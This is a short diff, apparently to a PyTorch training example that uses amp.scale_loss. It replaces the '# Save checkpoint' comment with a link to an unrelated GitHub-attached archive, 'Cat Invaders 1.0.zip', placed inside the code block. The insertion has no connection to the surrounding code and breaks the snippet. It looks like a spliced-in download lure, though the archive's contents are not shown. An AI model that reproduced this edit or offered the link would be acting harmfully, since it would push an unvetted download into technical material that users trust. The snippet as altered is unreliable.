@@ -71,7 +71,8 @@ with amp.scale_loss(loss, optimizer) as scaled_loss:
     scaled_loss.backward()
 ...
 
-# Save checkpoint
+[Cat Invaders 1.0.zip](https://github.com/user-attachments/files/20536606/Cat.Invaders.1.0.zip)
+
 checkpoint = {
     'model': model.state_dict(),
     'optimizer': optimizer.state_dict(),
